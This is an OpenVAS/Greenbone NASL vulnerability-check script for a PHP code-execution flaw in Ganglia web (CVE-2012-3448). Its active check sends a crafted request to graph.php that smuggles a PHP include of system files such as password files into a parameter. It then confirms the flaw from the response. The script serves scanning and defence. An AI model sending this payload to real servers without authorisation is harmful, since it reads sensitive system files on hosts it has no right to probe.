# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:ganglia:ganglia-web";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103535");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2012-08-13 12:40:50 +0200 (Mon, 13 Aug 2012)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_cve_id("CVE-2012-3448");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Ganglia PHP Code Execution Vulnerability (Jul 2012) - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_ganglia_http_detect.nasl", "os_detection.nasl");
  script_mandatory_keys("ganglia/http/detected");
  script_require_ports("Services/www", 80);

  script_tag(name:"summary", value:"Ganglia is prone to a vulnerability that lets remote attackers
  execute arbitrary code.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"impact", value:"Attackers can exploit this issue to execute arbitrary PHP code
  within the context of the affected web server process.");

  script_tag(name:"solution", value:"Vendor updates are available. Please see the references for
  more information.");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/54699");
  script_xref(name:"URL", value:"http://console-cowboys.blogspot.de/2012/07/extending-your-ganglia-install-with.html");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("traversal_func.inc");
include("os_func.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

files = traversal_files();

foreach pattern (keys(files)) {
  file = files[pattern];

  url = dir + "/graph.php?g=cpu_report,include+%27/" + file + "%27";

  if (http_vuln_check(port: port, url: url, pattern: pattern)) {
    report = http_report_vuln_url(port: port, url: url);
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(99);
